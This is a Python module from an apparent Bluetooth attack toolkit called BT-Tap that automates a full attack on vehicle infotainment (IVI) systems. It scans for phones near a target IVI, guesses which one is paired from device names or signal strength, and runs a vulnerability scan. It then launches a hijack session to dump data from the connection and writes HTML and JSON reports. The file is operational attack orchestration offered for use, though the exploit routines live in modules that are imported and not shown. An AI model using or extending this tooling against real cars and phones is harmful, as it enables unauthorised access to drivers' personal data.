"""Auto-discovery and full automated attack workflow.

Discovers IVI-paired phones by passive scanning, then runs the complete
hijack chain automatically: scan -> identify phone -> hijack -> dump -> report.
"""

import os
import time

from bt_tap.core.scanner import scan_classic
from bt_tap.utils.bt_helpers import normalize_mac
from bt_tap.utils.output import info, success, error, warning, console


def _rssi_key(d):
    """Safe RSSI sort key — handles string values like 'N/A' from Classic scan."""
    rssi = d.get("rssi", -999)
    try:
        return int(rssi)
    except (ValueError, TypeError):
        return -999


class AutoDiscovery:
    """Automated IVI attack workflow."""

    def __init__(self, ivi_address: str, hci: str = "hci0"):
        self.ivi_address = normalize_mac(ivi_address)
        self.hci = hci

    def discover_paired_phone(self, scan_duration: int = 30) -> dict | None:
        """Scan and identify which phone is interacting with the IVI.

        Scans for nearby devices and looks for phones (by device class or name)
        that are likely paired with the target IVI.
        """
        from bt_tap.utils.bt_helpers import ensure_adapter_ready
        if not ensure_adapter_ready(self.hci):
            return None

        info(f"Scanning for phones near IVI {self.ivi_address} ({scan_duration}s)...")
        devices = scan_classic(scan_duration, self.hci)

        if not devices:
            warning("No devices found during scan")
            return None

        # Filter out the IVI itself and look for phone-like devices
        candidates = []
        for dev in devices:
            addr = dev.get("address", "")
            if addr.upper() == self.ivi_address:
                continue

            name = dev.get("name", "").lower()
            dev_class = dev.get("class", "")

            # Heuristic: phones typically have recognizable names or class
            phone_keywords = ["phone", "galaxy", "iphone", "pixel", "oneplus",
                              "huawei", "xiaomi", "samsung", "oppo", "vivo",
                              "motorola", "nokia", "lg", "sony", "htc"]
            is_phone = any(kw in name for kw in phone_keywords)

            # Use device class parser for reliable phone detection
            if dev.get("class_info", {}).get("is_phone"):
                is_phone = True
            elif dev_class:
                from bt_tap.core.scanner import parse_device_class
                class_info = parse_device_class(dev_class)
                if class_info.get("is_phone"):
                    is_phone = True

            if is_phone:
                candidates.append(dev)

        if not candidates:
            warning("No phone devices identified. Listing all found devices:")
            for dev in devices:
                if dev.get("address", "").upper() != self.ivi_address:
                    info(f"  {dev.get('address')} - {dev.get('name', 'Unknown')}")
            # Return strongest signal device as best guess
            non_ivi = [d for d in devices if d.get("address", "").upper() != self.ivi_address]
            if non_ivi:
                best = max(non_ivi, key=_rssi_key)
                warning(f"Best guess (strongest signal): {best.get('address')}")
                return best
            return None

        # Pick strongest signal phone
        best = max(candidates, key=_rssi_key)
        success(f"Identified phone: {best.get('name', 'Unknown')} ({best.get('address')})")
        return best

    def run_auto(self, output_dir: str = "auto_output",
                 scan_duration: int = 30) -> dict:
        """Full automated attack: scan -> identify -> hijack -> dump -> report."""
        from bt_tap.attack.hijack import HijackSession

        console.rule("[bold red]BT-Tap Auto Attack Mode")
        results = {"status": "started", "phases": {}}

        # Phase 1: Discover phone
        info("Phase 1: Discovering paired phone...")
        phone = self.discover_paired_phone(scan_duration)
        if not phone:
            error("Could not identify a phone. Aborting.")
            results["status"] = "failed"
            results["phases"]["discovery"] = {"status": "failed"}
            return results

        phone_addr = phone.get("address", "")
        phone_name = phone.get("name", "")
        results["phases"]["discovery"] = {
            "status": "success",
            "phone_address": phone_addr,
            "phone_name": phone_name,
        }

        # Phase 2: Vulnerability scan
        info("Phase 2: Running vulnerability scan...")
        try:
            from bt_tap.attack.vuln_scanner import scan_vulnerabilities
            findings = scan_vulnerabilities(self.ivi_address, self.hci)
            results["phases"]["vuln_scan"] = {
                "status": "success",
                "finding_count": len(findings),
            }
        except Exception as e:
            warning(f"Vulnerability scan failed: {e}")
            findings = []
            results["phases"]["vuln_scan"] = {"status": "failed", "error": str(e)}

        # Phase 3: Run hijack session
        info("Phase 3: Running hijack session...")
        session = HijackSession(
            ivi_address=self.ivi_address,
            phone_address=phone_addr,
            phone_name=phone_name,
            hci=self.hci,
            output_dir=output_dir,
        )

        try:
            attack_results = session.run_full_attack()
            results["phases"]["hijack"] = attack_results
        except Exception as e:
            error(f"Hijack failed: {e}")
            results["phases"]["hijack"] = {"status": "failed", "error": str(e)}
        finally:
            session.cleanup()

        # Phase 4: Generate report
        info("Phase 4: Generating report...")
        try:
            from bt_tap.report.generator import ReportGenerator
            report = ReportGenerator()
            report.load_from_directory(output_dir)
            report.add_scan_results([phone])
            report.add_vuln_findings(findings)
            report_path = os.path.join(output_dir, "report.html")
            report.generate_html(report_path)
            report.generate_json(os.path.join(output_dir, "report.json"))
            results["phases"]["report"] = {"status": "success", "file": report_path}
        except Exception as e:
            warning(f"Report generation failed: {e}")
            results["phases"]["report"] = {"status": "failed", "error": str(e)}

        # Determine overall status from phase results
        failed = []
        succeeded = []
        for name, phase_data in results["phases"].items():
            if not isinstance(phase_data, dict):
                continue
            s = phase_data.get("status", "")
            if s in ("success", "complete", "ready"):
                succeeded.append(name)
            elif s == "failed":
                failed.append(name)
            elif name == "hijack" and "phases" in phase_data:
                # Nested hijack result — check sub-phases
                sub_failed = any(
                    v.get("status") == "failed"
                    for v in phase_data["phases"].values()
                    if isinstance(v, dict)
                )
                (failed if sub_failed else succeeded).append(name)

        if not failed:
            results["status"] = "complete"
        elif succeeded:
            results["status"] = "partial"
        else:
            results["status"] = "failed"

        color = {"complete": "green", "partial": "yellow", "failed": "red"}[results["status"]]
        console.rule(f"[bold {color}]Auto Attack {results['status'].title()}")
        return results
